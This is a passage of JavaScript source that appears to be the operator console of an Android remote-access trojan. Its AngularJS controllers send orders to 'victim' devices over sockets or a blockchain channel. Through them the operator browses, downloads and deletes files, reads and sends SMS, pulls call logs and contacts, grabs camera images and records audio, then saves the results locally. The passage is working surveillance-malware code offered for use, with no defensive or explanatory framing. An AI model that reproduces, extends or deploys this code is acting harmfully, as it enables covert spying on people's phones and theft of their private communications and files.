                            // Write Base64 string directly with base64 encoding
                            fs.outputFile(filePath, imageBuffer, 'base64', saveCallback);
                        } else {
                            // Write Buffer directly
                            fs.outputFile(filePath, imageBuffer, saveCallback);
                        }
                    }
                } catch (e) {
                    console.error('[CamCtrl] Error processing image:', e);
                    $camCtrl.lastError = 'Error processing image data: ' + e.message;
                    $rootScope.Log(`[✗] Error processing image: ${e.message}`, CONSTANTS.logStatus.FAIL);
                }
            } else {
                console.warn('[CamCtrl] No buffer in data:', data);
                $camCtrl.lastError = 'No image buffer in response';
                $rootScope.Log('[✗] No image buffer received', CONSTANTS.logStatus.FAIL);
            }
            
            // Always apply at the end to ensure view updates
            $timeout(() => {
                console.log('[CamCtrl] End of handler - imgUrl:', $scope.imgUrl ? 'SET' : 'NOT SET');
                if (!$scope.$$phase && !$scope.$root.$$phase) {
                    $scope.$apply();
                }
            }, 0);
            
            // Final apply to ensure view updates - always use $timeout to be safe
            $timeout(() => {
                // Verify imgUrl is still set
                if ($scope.imgUrl || $camCtrl.imgUrl) {
                    const finalImgUrl = $scope.imgUrl || $camCtrl.imgUrl;
                    console.log('[CamCtrl] Final apply - imgUrl exists:', !!finalImgUrl, 'length:', finalImgUrl ? finalImgUrl.length : 0);
                    
                    // Ensure both are set
                    if ($scope.imgUrl !== finalImgUrl) {
                        $scope.imgUrl = finalImgUrl;
                    }
                    if ($camCtrl.imgUrl !== finalImgUrl) {
                        $camCtrl.imgUrl = finalImgUrl;
                    }
                    
                    // Log for debugging template binding
                    console.log('[CamCtrl] Template should show image if ng-if="imgUrl" evaluates to true');
                    console.log('[CamCtrl] $scope.imgUrl truthy check:', !!$scope.imgUrl);
                    console.log('[CamCtrl] $camCtrl.imgUrl truthy check:', !!$camCtrl.imgUrl);
                } else {
                    console.warn('[CamCtrl] WARNING: imgUrl was lost before final apply!');
                }
                
                // Apply changes
                if (!$scope.$$phase && !$scope.$root.$$phase) {
                    $scope.$apply();
                    console.log('[CamCtrl] Final $apply() completed');
                } else {
                    console.log('[CamCtrl] Already in digest, using $evalAsync');
                    $scope.$evalAsync(() => {
                        // Re-set imgUrl in evalAsync to ensure it's in the digest
                        if ($scope.imgUrl || $camCtrl.imgUrl) {
                            const finalImgUrl = $scope.imgUrl || $camCtrl.imgUrl;
                            $scope.imgUrl = finalImgUrl;
                            $camCtrl.imgUrl = finalImgUrl;
                        }
                    });
                }
            }, 100); // Slightly longer delay to ensure everything is set
        } else if (data.image == false) {
            // Explicit failure
            $camCtrl.lastError = data.error || 'Camera capture failed';
            $rootScope.Log(`[✗] Camera capture failed: ${data.error || 'Unknown error'}`, CONSTANTS.logStatus.FAIL);
            if (!$scope.$$phase && !$scope.$root.$$phase) {
                $scope.$apply();
            }
        }
        
        // Final apply at the very end of the handler
        $timeout(() => {
            if (!$scope.$$phase && !$scope.$root.$$phase) {
                $scope.$apply();
            }
        }, 0);
    });

    // Initial load - get camera list with connection check
    if (checkConnection()) {
        $rootScope.Log('[→] Fetching camera list...', CONSTANTS.logStatus.INFO);
        $camCtrl.load = 'loading';
        setResponseTimeout('camera list', 60000);
        // Main camera listener above already handles camList responses; avoid replacing it
        socket.emit(ORDER, { order: camera, extra: 'camList' });
    }
});






//-----------------------File Controller (fileManager.htm)------------------------
// File controller
app.controller("FmCtrl", function ($scope, $rootScope) {
    $fmCtrl = $scope;
    $fmCtrl.load = 'loading';
    $fmCtrl.files = [];
    $fmCtrl.currentPath = '/storage/emulated/0';
    $fmCtrl.pathHistory = [];
    $fmCtrl.canGoBack = false;
    $fmCtrl.pathParts = [];
    $fmCtrl.folderCount = 0;
    $fmCtrl.fileCount = 0;
    $fmCtrl.totalSize = 0;
    var fileManager = CONSTANTS.orders.fileManager;

    // remove socket listener
    $fmCtrl.$on('$destroy', () => {
        socket.removeAllListeners(fileManager);
    });

    // infinite scrolling
    $fmCtrl.barLimit = 50;
    $fmCtrl.increaseLimit = () => {
        $fmCtrl.barLimit += 50;
    };

    // Update path parts for breadcrumb
    function updatePathParts(path) {
        $fmCtrl.pathParts = [];
        if (!path || path === '/') return;
        
        let parts = path.split('/').filter(p => p);
        let currentPath = '';
        parts.forEach(part => {
            currentPath += '/' + part;
            $fmCtrl.pathParts.push({ name: part, path: currentPath });
        });
    }

    // Update file stats
    function updateStats() {
        $fmCtrl.folderCount = $fmCtrl.files.filter(f => f.isDir).length;
        $fmCtrl.fileCount = $fmCtrl.files.filter(f => !f.isDir).length;
        $fmCtrl.totalSize = $fmCtrl.files.reduce((acc, f) => acc + (f.size || 0), 0);
    }

    // Format file size
    $fmCtrl.formatSize = (bytes) => {
        if (!bytes || bytes === 0) return '0 B';
        const sizes = ['B', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(1024));
        return (bytes / Math.pow(1024, i)).toFixed(1) + ' ' + sizes[i];
    };

    // Navigate to path
    $fmCtrl.goToPath = (path) => {
        if (path) {
            $fmCtrl.pathHistory.push($fmCtrl.currentPath);
            $fmCtrl.canGoBack = true;
            $fmCtrl.currentPath = path;
            $fmCtrl.load = 'loading';
            $fmCtrl.barLimit = 50;
            updatePathParts(path);
            $rootScope.Log(`[→] Opening: ${path}`, CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: path });
        }
    };

    // Go back
    $fmCtrl.goBack = () => {
        if ($fmCtrl.pathHistory.length > 0) {
            let prevPath = $fmCtrl.pathHistory.pop();
            $fmCtrl.canGoBack = $fmCtrl.pathHistory.length > 0;
            $fmCtrl.currentPath = prevPath;
            $fmCtrl.load = 'loading';
            $fmCtrl.barLimit = 50;
            updatePathParts(prevPath);
            $rootScope.Log(`[→] Going back to: ${prevPath}`, CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: prevPath });
        }
    };

    // Go home
    $fmCtrl.goHome = () => {
        $fmCtrl.pathHistory = [];
        $fmCtrl.canGoBack = false;
        $fmCtrl.goToPath('/storage/emulated/0');
    };

    // Refresh current directory
    $fmCtrl.refreshDir = () => {
        $fmCtrl.load = 'loading';
        $fmCtrl.barLimit = 50;
        $rootScope.Log(`[→] Refreshing: ${$fmCtrl.currentPath}`, CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: fileManager, extra: 'ls', path: $fmCtrl.currentPath });
    };

    // Copy path to clipboard
    $fmCtrl.copyPath = () => {
        if (navigator.clipboard) {
            navigator.clipboard.writeText($fmCtrl.currentPath);
            $rootScope.Log('[✓] Path copied to clipboard', CONSTANTS.logStatus.SUCCESS);
        }
    };

    // When folder/file is clicked - handles both path string and file object
    $fmCtrl.getFiles = (itemOrPath) => {
        let targetPath;
        
        if (typeof itemOrPath === 'string') {
            // Direct path string (from quick access or breadcrumb)
            targetPath = itemOrPath;
        } else if (itemOrPath && typeof itemOrPath === 'object') {
            // File object
            if (!itemOrPath.isDir) return; // Only navigate into folders
            targetPath = itemOrPath.path || ($fmCtrl.currentPath + '/' + itemOrPath.name);
        } else {
            return;
        }
        
        if (targetPath) {
            $fmCtrl.goToPath(targetPath);
        }
    };
    
    // Open folder - wrapper for consistency
    $fmCtrl.openFolder = (file) => {
        if (file && file.isDir) {
            let targetPath = file.path || ($fmCtrl.currentPath + '/' + file.name);
            $fmCtrl.goToPath(targetPath);
        }
    };

    // Save/download file
    $fmCtrl.saveFile = (filePath) => {
        $rootScope.Log(`[→] Downloading: ${filePath}`, CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: fileManager, extra: 'dl', path: filePath });
    };

    // Delete file/folder
    $fmCtrl.deleteFile = (filePath, fileName) => {
        if (confirm(`Are you sure you want to delete "${fileName}"?`)) {
            $rootScope.Log(`[→] Deleting: ${filePath}`, CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, { order: fileManager, extra: 'delete', path: filePath });
        }
    };

    // Check connection before operations
    function checkConnection() {
        if (isBlockchainVictim()) {
            return true;
        }
        if (!originalSocket || !originalSocket.connected) {
            $rootScope.Log('[?] Not connected to device!', CONSTANTS.logStatus.FAIL);
            $fmCtrl.load = '';
            return false;
        }
        return true;
    }

    // Chunked file transfer state tracking
    const chunkedTransfers = new Map(); // transferId -> {chunks: Map, totalChunks, fileName, filePath, receivedChunks: Set}
    
    // Socket handler
    socket.on(fileManager, (data) => {
        console.log('[FmCtrl] Received file manager data:', typeof data, Array.isArray(data) ? `Array(${data.length})` : (data ? Object.keys(data).join(',') : 'null'));
        
        if (!data || (typeof data === 'object' && Object.keys(data).length === 0)) {
            // Empty data - might be from blockchain response issue
            console.warn('[FmCtrl] Empty data received, ignoring');
            return;
        }
        
        // Handle chunked file transfer
        if (data.chunked === true && data.transferId) {
            handleChunkedFileTransfer(data);
            return;
        }
        
        // Handle blockchain response format: {event: "x0000fm", data: {files: [...]}}
        // Also handle TCP format: {files: [...]} or just [...]
        let fileData = data;
        let filesArray = null;
        
        // Check for blockchain format: data.data.files
        if (data.data && data.data.files && Array.isArray(data.data.files)) {
            filesArray = data.data.files;
            fileData = data.data; // Use data.data for other properties (deleted, file, etc.)
        }
        // Check for direct files property: data.files
        else if (data.files && Array.isArray(data.files)) {
            filesArray = data.files;
        }
        // Check if data.data is already an array (TCP format)
        else if (data.data && Array.isArray(data.data)) {
            filesArray = data.data;
            fileData = data.data;
        }
        // Check if data itself is an array (direct TCP format)
        else if (Array.isArray(data)) {
            filesArray = data;
            fileData = data;
        }
        // Check if data.data is an object with files property
        else if (data.data && typeof data.data === 'object' && data.data.files && Array.isArray(data.data.files)) {
            filesArray = data.data.files;
            fileData = data.data;
        }
        
        // Handle files array response (directory listing)
        if (filesArray !== null) {
            // Ignore empty responses if we already have files loaded (prevent overwriting with empty)
            if (filesArray.length === 0 && $fmCtrl.files && $fmCtrl.files.length > 0) {
                console.log('[FmCtrl] Ignoring empty response - already have files loaded');
                return;
            }
            
            if (filesArray.length > 0) {
                $rootScope.Log(`[✓] Found ${filesArray.length} items`, CONSTANTS.logStatus.SUCCESS);
                $fmCtrl.load = '';
                $fmCtrl.files = filesArray.sort((a, b) => {
                    // Folders first, then alphabetical
                    if (a.isDir && !b.isDir) return -1;
                    if (!a.isDir && b.isDir) return 1;
                    return (a.name || '').localeCompare(b.name || '');
                });
                updateStats();
                $fmCtrl.$apply();
            } else {
                // Empty directory
                $rootScope.Log('[ℹ] Directory is empty', CONSTANTS.logStatus.INFO);
                $fmCtrl.load = '';
                $fmCtrl.files = [];
                updateStats();
                $fmCtrl.$apply();
            }
            return;
        }
        
        // Handle other response types (delete, download, etc.)
        if (fileData.deleted !== undefined) {
            // Delete response
            if (fileData.deleted) {
                $rootScope.Log(`[✓] Deleted: ${fileData.path}`, CONSTANTS.logStatus.SUCCESS);
                // Refresh current directory
                if (checkConnection()) {
                    socket.emit(ORDER, { order: fileManager, extra: 'ls', path: $fmCtrl.currentPath });
                }
            } else {
                $rootScope.Log(`[✗] Failed to delete: ${fileData.path}`, CONSTANTS.logStatus.FAIL);
            }
        } else if (fileData.file == true && !fileData.chunked) {
            // Non-chunked file download response
            $rootScope.Log('[→] Downloading file...', CONSTANTS.logStatus.INFO);
            var filePath = path.join(downloadsPath, fileData.name);
            fs.outputFile(filePath, fileData.buffer, (err) => {
                if (err)
                    $rootScope.Log('[✗] Failed to save file', CONSTANTS.logStatus.FAIL);
                else
                    $rootScope.Log(`[✓] File saved: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
            });
        } else {
            // Unknown format - log for debugging
            console.warn('[FmCtrl] Unknown data format:', JSON.stringify(fileData).substring(0, 200));
            console.warn('[FmCtrl] Full data structure:', JSON.stringify(data).substring(0, 500));
            $rootScope.Log('[⚠] Unexpected response format', CONSTANTS.logStatus.WARNING);
            // Don't clear files if we have them - might be a malformed response
            if (!$fmCtrl.files || $fmCtrl.files.length === 0) {
                $fmCtrl.load = '';
                $fmCtrl.files = [];
                updateStats();
                $fmCtrl.$apply();
            }
        }
    });
    
    /**
     * Handle chunked file transfer
     */
    function handleChunkedFileTransfer(data) {
        const transferId = data.transferId;
        
        // Check if this is the initial transfer info
        if (data.chunkIndex === undefined && data.totalChunks !== undefined) {
            console.log(`[FmCtrl] Starting chunked transfer: ${data.name} (${data.totalChunks} chunks, ${data.size} bytes)`);
            $rootScope.Log(`[→] Receiving chunked file: ${data.name} (${data.totalChunks} chunks)`, CONSTANTS.logStatus.INFO);
            
            // Initialize transfer state
            chunkedTransfers.set(transferId, {
                chunks: new Map(), // chunkIndex -> buffer
                totalChunks: data.totalChunks,
                fileName: data.name,
                filePath: data.path,
                fileSize: data.size,
                receivedChunks: new Set(),
                startTime: Date.now()
            });
            return;
        }
        
        // Handle chunk data
        if (data.chunkIndex !== undefined && data.buffer !== undefined) {
            const transfer = chunkedTransfers.get(transferId);
            if (!transfer) {
                console.warn(`[FmCtrl] Received chunk for unknown transfer: ${transferId}`);
                return;
            }
            
            const chunkIndex = data.chunkIndex;
            
            // Store chunk if not already received
            if (!transfer.receivedChunks.has(chunkIndex)) {
                // Convert buffer to Buffer if needed
                let chunkBuffer;
                if (Buffer.isBuffer(data.buffer)) {
                    chunkBuffer = data.buffer;
                } else if (data.buffer instanceof ArrayBuffer) {
                    chunkBuffer = Buffer.from(data.buffer);
                } else if (Array.isArray(data.buffer)) {
                    chunkBuffer = Buffer.from(data.buffer);
                } else if (typeof data.buffer === 'string') {
                    // Base64 encoded
                    chunkBuffer = Buffer.from(data.buffer, 'base64');
                } else {
                    console.error('[FmCtrl] Unknown buffer format for chunk:', typeof data.buffer);
                    return;
                }
                
                transfer.chunks.set(chunkIndex, chunkBuffer);
                transfer.receivedChunks.add(chunkIndex);
                
                console.log(`[FmCtrl] Received chunk ${chunkIndex + 1}/${transfer.totalChunks} for transfer ${transferId}`);
                
                // Send ACK to client
                sendChunkAck(transferId, chunkIndex);
                
                // Check if all chunks received
                if (transfer.receivedChunks.size === transfer.totalChunks) {
                    assembleAndSaveFile(transferId, transfer);
                }
            } else {
                // Chunk already received, just send ACK
                sendChunkAck(transferId, chunkIndex);
            }
        }
    }
    
    /**
     * Send chunk ACK to client
     */
    function sendChunkAck(transferId, chunkIndex) {
        try {
            const ackData = {
                transferId: transferId,
                chunkIndex: chunkIndex
            };
            
            // Send via socket wrapper (works for both TCP/IP and blockchain)
            if (checkConnection()) {
                // Use socket wrapper which handles both TCP/IP and blockchain modes
                if (originalSocket && originalSocket.connected) {
                    originalSocket.emit('chunk_ack', ackData);
                    console.log(`[FmCtrl] Sent chunk ACK: ${transferId}:${chunkIndex}`);
                } else if (isBlockchainVictim()) {
                    // For blockchain mode, ACKs would need to be sent via blockchain response
                    // For now, we'll just log it - the client will retransmit if needed
                    console.log(`[FmCtrl] Chunk ACK (blockchain mode - ACK via response): ${transferId}:${chunkIndex}`);
                    // Note: In blockchain mode, the client tracks chunks and will retransmit
                    // if ACKs are missing. The server can include ACK info in the response.
                }
            }
        } catch (err) {
            console.error('[FmCtrl] Error sending chunk ACK:', err);
        }
    }
    
    /**
     * Assemble chunks and save file
     */
    function assembleAndSaveFile(transferId, transfer) {
        try {
            console.log(`[FmCtrl] Assembling file: ${transfer.fileName} (${transfer.chunks.size} chunks)`);
            
            // Sort chunks by index
            const sortedChunks = [];
            for (let i = 0; i < transfer.totalChunks; i++) {
                const chunk = transfer.chunks.get(i);
                if (!chunk) {
                    console.error(`[FmCtrl] Missing chunk ${i} for transfer ${transferId}`);
                    $rootScope.Log(`[✗] Missing chunk ${i} for ${transfer.fileName}`, CONSTANTS.logStatus.FAIL);
                    chunkedTransfers.delete(transferId);
                    return;
                }
                sortedChunks.push(chunk);
            }
            
            // Concatenate all chunks
            const fileBuffer = Buffer.concat(sortedChunks);
            
            // Verify size
            if (fileBuffer.length !== transfer.fileSize) {
                console.warn(`[FmCtrl] File size mismatch: expected ${transfer.fileSize}, got ${fileBuffer.length}`);
            }
            
            // Save file
            const filePath = path.join(downloadsPath, transfer.fileName);
            fs.outputFile(filePath, fileBuffer, (err) => {
                if (err) {
                    console.error('[FmCtrl] Error saving file:', err);
                    $rootScope.Log(`[✗] Failed to save file: ${transfer.fileName}`, CONSTANTS.logStatus.FAIL);
                } else {
                    const elapsed = ((Date.now() - transfer.startTime) / 1000).toFixed(1);
                    const sizeMB = (transfer.fileSize / 1024 / 1024).toFixed(2);
                    console.log(`[FmCtrl] File saved: ${filePath} (${sizeMB} MB, ${elapsed}s)`);
                    $rootScope.Log(`[✓] File saved: ${transfer.fileName} (${sizeMB} MB, ${elapsed}s)`, CONSTANTS.logStatus.SUCCESS);
                }
                chunkedTransfers.delete(transferId);
            });
        } catch (err) {
            console.error('[FmCtrl] Error assembling file:', err);
            $rootScope.Log(`[✗] Error assembling file: ${transfer.fileName}`, CONSTANTS.logStatus.FAIL);
            chunkedTransfers.delete(transferId);
        }
    }

    // Initial load - ensure listener is registered first
    updatePathParts($fmCtrl.currentPath);
    if (checkConnection()) {
        $rootScope.Log('[→] Loading file manager...', CONSTANTS.logStatus.INFO);
        // Small delay to ensure listener is registered
        setTimeout(() => {
            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: $fmCtrl.currentPath });
        }, 50);
    }
});








//-----------------------SMS Controller (sms.htm)------------------------
// SMS controller
app.controller("SMSCtrl", function ($scope, $rootScope, $timeout) {
    $SMSCtrl = $scope;
    var sms = CONSTANTS.orders.sms;
    $SMSCtrl.smsList = [];
    $SMSCtrl.activeTab = 'inbox';  // Initialize active tab
    $SMSCtrl.phoneNo = '';  // Initialize phone number
    $SMSCtrl.msg = '';  // Initialize message
    $('.menu .item')
        .tab();

    $SMSCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(sms);
    });

    // Check connection before operations
    function checkConnection() {
        if (isBlockchainVictim()) {
            return true;
        }
        if (!originalSocket || !originalSocket.connected) {
            $rootScope.Log('[?] Not connected to device!', CONSTANTS.logStatus.FAIL);
            $SMSCtrl.load = '';
            return false;
        }
        return true;
    }

    // send request to victim to bring all sms
    $SMSCtrl.getSMSList = () => {
        if (!checkConnection()) return;
        $SMSCtrl.load = 'loading';
        $SMSCtrl.barLimit = 50;
        $rootScope.Log('[→] Fetching SMS list...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: sms, extra: 'ls' });
    }

    $SMSCtrl.increaseLimit = () => {
        $SMSCtrl.barLimit += 50;
    }

    // Clear SMS form
    $SMSCtrl.clearForm = () => {
        $SMSCtrl.phoneNo = '';
        $SMSCtrl.msg = '';
        $rootScope.Log('[→] Form cleared', CONSTANTS.logStatus.INFO);
    }

    // send request to victim to send sms
    $SMSCtrl.SendSMS = (phoneNo, msg) => {
        if (!checkConnection()) return;
        if (!phoneNo || !msg || phoneNo.trim() === '' || msg.trim() === '') {
            $rootScope.Log('[✗] Please enter both phone number and message', CONSTANTS.logStatus.FAIL);
            return;
        }
        $rootScope.Log(`[→] Sending SMS to ${phoneNo}...`, CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: sms, extra: 'sendSMS', to: phoneNo.trim(), sms: msg.trim() });
        // Clear form after sending
        $SMSCtrl.clearForm();
    }

    // save sms list to csv file
    $SMSCtrl.SaveSMS = () => {

        if ($SMSCtrl.smsList.length == 0)
            return;


        var csvRows = [];
        for (var i = 0; i < $SMSCtrl.smsList.length; i++) {
            csvRows.push($SMSCtrl.smsList[i].phoneNo + "," + $SMSCtrl.smsList[i].msg);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "SMS_" + Date.now() + ".csv");
        $rootScope.Log("[→] Saving SMS list...", CONSTANTS.logStatus.INFO);
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log(`[✗] Failed to save: ${csvPath}`, CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log(`[✓] SMS list saved: ${csvPath}`, CONSTANTS.logStatus.SUCCESS);

        });

    }
    
    // SMS conversation modal state
    $SMSCtrl.showConversation = false;
    $SMSCtrl.conversationPhone = null;
    $SMSCtrl.conversationMessages = [];
    
    // Open conversation window for a phone number
    $SMSCtrl.openConversation = (phoneNo) => {
        if (!phoneNo) return;
        $SMSCtrl.conversationPhone = phoneNo;
        // Filter messages for this phone number
        $SMSCtrl.conversationMessages = $SMSCtrl.smsList.filter(sms => sms.phoneNo === phoneNo);
        // Sort by date
        $SMSCtrl.conversationMessages.sort((a, b) => {
            var dateA = a.date ? new Date(a.date) : new Date(0);
            var dateB = b.date ? new Date(b.date) : new Date(0);
            return dateA - dateB;
        });
        $SMSCtrl.showConversation = true;
        // Use $timeout to avoid $apply already in progress error
        if (!$SMSCtrl.$$phase && !$rootScope.$$phase) {
            $SMSCtrl.$apply();
        } else {
            $timeout(function() {
                // Already applied, just ensure UI updates
            }, 0);
        }
    };
    
    // Close conversation window
    $SMSCtrl.closeConversation = () => {
        $SMSCtrl.showConversation = false;
        $SMSCtrl.conversationPhone = null;
        $SMSCtrl.conversationMessages = [];
    };
    
    // Reply to SMS
    $SMSCtrl.replyToSms = (sms) => {
        $SMSCtrl.activeTab = 'send';
        $SMSCtrl.phoneNo = sms.phoneNo;
        $SMSCtrl.msg = '';
        $SMSCtrl.$apply();
    };
    
    // Copy SMS to clipboard
    $SMSCtrl.copySms = (sms) => {
        var text = `From: ${sms.phoneNo}\nDate: ${sms.date || 'N/A'}\nMessage: ${sms.msg}`;
        if (navigator.clipboard) {
            navigator.clipboard.writeText(text).then(() => {
                $rootScope.Log('[✓] SMS copied to clipboard', CONSTANTS.logStatus.SUCCESS);
            });
        }
    };


    //listening for victim response
    socket.on(sms, (data) => {
        if (!data || (typeof data === 'object' && Object.keys(data).length === 0)) {
            // Empty data - might be from blockchain response issue
            return;
        }
        
        if (data.smsList) {
            $SMSCtrl.load = '';
            $rootScope.Log(`[✓] SMS list received: ${data.smsList.length} messages`, CONSTANTS.logStatus.SUCCESS);
            $SMSCtrl.smsList = data.smsList;
            $SMSCtrl.smsSize = data.smsList.length;
            
            // Save to DB
            if (db) {
                try {
                    db.saveSMS(data.smsList);
                } catch (e) { console.error(e); }
            }
            
            $SMSCtrl.$apply();
        } else {
            if (data == true) {
                $rootScope.Log('[✓] SMS sent successfully', CONSTANTS.logStatus.SUCCESS);
                // Refresh list to show sent message
                setTimeout(() => {
                    $SMSCtrl.getSMSList();
                }, 1000);
            } else {
                $rootScope.Log('[✗] Failed to send SMS', CONSTANTS.logStatus.FAIL);
            }
        }
    });



});










//-----------------------Calls Controller (callslogs.htm)------------------------
// Calls controller
app.controller("CallsCtrl", function ($scope, $rootScope) {
    $CallsCtrl = $scope;
    $CallsCtrl.callsList = [];
    var calls = CONSTANTS.orders.calls;

    $CallsCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(calls);
    });

    // Check connection before operations
    function checkConnection() {
        if (isBlockchainVictim()) {
            return true;
        }
        if (!originalSocket || !originalSocket.connected) {
            $rootScope.Log('[?] Not connected to device!', CONSTANTS.logStatus.FAIL);
            $CallsCtrl.load = '';
            return false;
        }
        return true;
    }

    // Register listener first, then emit
    socket.on(calls, (data) => {
        if (!data || (typeof data === 'object' && Object.keys(data).length === 0)) {
            // Empty data - might be from blockchain response issue
            return;
        }
        
        if (data.callsList) {
            $CallsCtrl.load = '';
            $rootScope.Log(`[✓] Call logs received: ${data.callsList.length} entries`, CONSTANTS.logStatus.SUCCESS);
            $CallsCtrl.callsList = data.callsList;
            $CallsCtrl.logsSize = data.callsList.length;
            
            // Save to DB
            if (db) {
                try {
                    db.saveCalls(data.callsList);
                } catch (e) { console.error(e); }
            }
            
            $CallsCtrl.$apply();
        }
    });

    if (checkConnection()) {
        $CallsCtrl.load = 'loading';
        $rootScope.Log('[→] Fetching call logs...', CONSTANTS.logStatus.INFO);
        // Small delay to ensure listener is registered
        setTimeout(() => {
            socket.emit(ORDER, { order: calls });
        }, 50);
    }


    $CallsCtrl.barLimit = 50;
    $CallsCtrl.increaseLimit = () => {
        $CallsCtrl.barLimit += 50;
    }

    $CallsCtrl.SaveCalls = () => {
        if ($CallsCtrl.callsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $CallsCtrl.callsList.length; i++) {
            var type = (($CallsCtrl.callsList[i].type) == 1 ? "INCOMING" : "OUTGOING");
            var name = (($CallsCtrl.callsList[i].name) == null ? "Unknown" : $CallsCtrl.callsList[i].name);
            csvRows.push($CallsCtrl.callsList[i].phoneNo + "," + name + "," + $CallsCtrl.callsList[i].duration + "," + type);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Calls_" + Date.now() + ".csv");
        $rootScope.Log("[→] Saving call logs...", CONSTANTS.logStatus.INFO);
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log(`[✗] Failed to save: ${csvPath}`, CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log(`[✓] Call logs saved: ${csvPath}`, CONSTANTS.logStatus.SUCCESS);

        });

    }



});





//-----------------------Contacts Controller (contacts.htm)------------------------
// Contacts controller
app.controller("ContCtrl", function ($scope, $rootScope) {
    $ContCtrl = $scope;
    $ContCtrl.contactsList = [];
    var contacts = CONSTANTS.orders.contacts;

    $ContCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(contacts);
    });

    // Check connection before operations
    function checkConnection() {
        if (isBlockchainVictim()) {
            return true;
        }
        if (!originalSocket || !originalSocket.connected) {
            $rootScope.Log('[?] Not connected to device!', CONSTANTS.logStatus.FAIL);
            $ContCtrl.load = '';
            return false;
        }
        return true;
    }

    // Register listener first, then emit
    socket.on(contacts, (data) => {
        if (!data || (typeof data === 'object' && Object.keys(data).length === 0)) {
            // Empty data - might be from blockchain response issue
            return;
        }
        
        if (data.contactsList) {
            $ContCtrl.load = '';
            $rootScope.Log(`[✓] Contacts received: ${data.contactsList.length} contacts`, CONSTANTS.logStatus.SUCCESS);
            $ContCtrl.contactsList = data.contactsList;
            $ContCtrl.contactsSize = data.contactsList.length;
            $ContCtrl.$apply();
        }
    });

    if (checkConnection()) {
        $ContCtrl.load = 'loading';
        $rootScope.Log('[→] Fetching contacts...', CONSTANTS.logStatus.INFO);
        // Small delay to ensure listener is registered
        setTimeout(() => {
            socket.emit(ORDER, { order: contacts });
        }, 50);
    }

    $ContCtrl.barLimit = 50;
    $ContCtrl.increaseLimit = () => {
        $ContCtrl.barLimit += 50;
    }

    $ContCtrl.SaveContacts = () => {

        if ($ContCtrl.contactsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $ContCtrl.contactsList.length; i++) {
            csvRows.push($ContCtrl.contactsList[i].phoneNo + "," + $ContCtrl.contactsList[i].name);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Contacts_" + Date.now() + ".csv");
        $rootScope.Log("[→] Saving contacts...", CONSTANTS.logStatus.INFO);
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log(`[✗] Failed to save: ${csvPath}`, CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log(`[✓] Contacts saved: ${csvPath}`, CONSTANTS.logStatus.SUCCESS);

        });

    }





});




//-----------------------Mic Controller (mic.htm)------------------------
// Mic controller
app.controller("MicCtrl", function ($scope, $rootScope) {
    $MicCtrl = $scope;
    $MicCtrl.isAudio = true;
    var mic = CONSTANTS.orders.mic;
    
    // Store recording data in scope so SaveAudio and clearRecording can access it
    $MicCtrl.recordingData = null;
    $MicCtrl.recordingName = null;
    
    $MicCtrl.SaveAudio = () => {
        if (!$MicCtrl.recordingData || !$MicCtrl.recordingName) {
            $rootScope.Log('[✗] No recording to save', CONSTANTS.logStatus.FAIL);
            return;
        }
        $rootScope.Log('[→] Saving audio file...', CONSTANTS.logStatus.INFO);
        var filePath = path.join(downloadsPath, $MicCtrl.recordingName);
        fs.outputFile(filePath, $MicCtrl.recordingData, (err) => {
            if (err)
                $rootScope.Log('[✗] Failed to save audio', CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log(`[✓] Audio saved: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
        });
    };
    
    $MicCtrl.clearRecording = () => {
        $MicCtrl.recordingData = null;
        $MicCtrl.recordingName = null;
        $MicCtrl.isAudio = true; // Hide player
        var player = document.getElementById('player');
        var sourceMp3 = document.getElementById('sourceMp3');
        if (player) {
            player.pause();
            player.src = '';
        }
        if (sourceMp3) {
            sourceMp3.src = '';
        }
        $rootScope.Log('[→] Recording discarded', CONSTANTS.logStatus.INFO);
        $MicCtrl.$apply();
    };

    $MicCtrl.$on('$destroy', function () {
        // release resources, cancel Listner...
        socket.removeAllListeners(mic);
    });

    // Check connection before operations
    function checkConnection() {
        if (isBlockchainVictim()) {
            return true;
        }
        if (!originalSocket || !originalSocket.connected) {
            $rootScope.Log('[?] Not connected to device!', CONSTANTS.logStatus.FAIL);
            return false;
        }
        return true;
    }

    $MicCtrl.Record = (seconds) => {
        if (!checkConnection()) return;

        if (seconds) {
            if (seconds > 0) {
                $rootScope.Log(`[→] Recording audio for ${seconds} seconds...`, CONSTANTS.logStatus.INFO);
                socket.emit(ORDER, { order: mic, sec: seconds });
            } else
                $rootScope.Log('[⚠] Recording duration must be greater than 0', CONSTANTS.logStatus.WARNING);

        }

    }


    socket.on(mic, (data) => {
        if (!data || (typeof data === 'object' && Object.keys(data).length === 0)) {
            // Empty data - might be from blockchain response issue
            return;
        }
        
        if (data.file == true) {
            $rootScope.Log('[✓] Audio recording received', CONSTANTS.logStatus.SUCCESS);

            var player = document.getElementById('player');
            var sourceMp3 = document.getElementById('sourceMp3');
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
